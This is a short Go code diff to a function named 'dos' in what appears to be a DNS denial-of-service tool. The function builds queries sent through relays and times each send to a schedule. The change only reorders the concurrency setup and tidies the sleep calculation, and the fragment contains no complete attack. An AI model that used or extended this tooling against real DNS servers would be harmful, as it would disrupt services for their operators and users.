@@ -423,12 +423,8 @@ func (app *App) dos(qtype uint16, multiLevel bool) {
 	fmt.Println("Prepared list length: ", len(records))
 
 	// start dos
-	lock := sync.Mutex{}
-	wg := sync.WaitGroup{}
-	wg.Add(len(records))
 	var totalCount atomic.Uint64
 	var successCount atomic.Uint64
-
 	// get the minimum sendTime
 	minSendTime := int64(0)
 	for _, record := range records {
@@ -451,6 +447,9 @@ func (app *App) dos(qtype uint16, multiLevel bool) {
 		record[3] = strconv.FormatInt(arrivalTime, 10)
 	}
 
+	lock := sync.Mutex{}
+	wg := sync.WaitGroup{}
+	wg.Add(len(records))
 	for i, record := range records {
 		recordCopy := make([]string, len(record))
 		copy(recordCopy, record)
@@ -469,10 +468,10 @@ func (app *App) dos(qtype uint16, multiLevel bool) {
 			q := app.buildQuery(server, relay, qtype, multiLevel)
 
 			// Sleep until sendTime
-			timeNow := NowUnixMillion()
-			if sendTime > timeNow {
-				log.Println("Sleep time: ", sendTime-timeNow, "ms")
-				time.Sleep(time.Duration(sendTime-timeNow) * time.Millisecond)
+			sleepTime := time.Duration(sendTime-NowUnixMillion()) * time.Millisecond
+			if sleepTime > 0 {
+				log.Println("Sleep time: ", sleepTime, "ms")
+				time.Sleep(sleepTime)
 			}
 
 			realSendTime := NowUnixMillion()
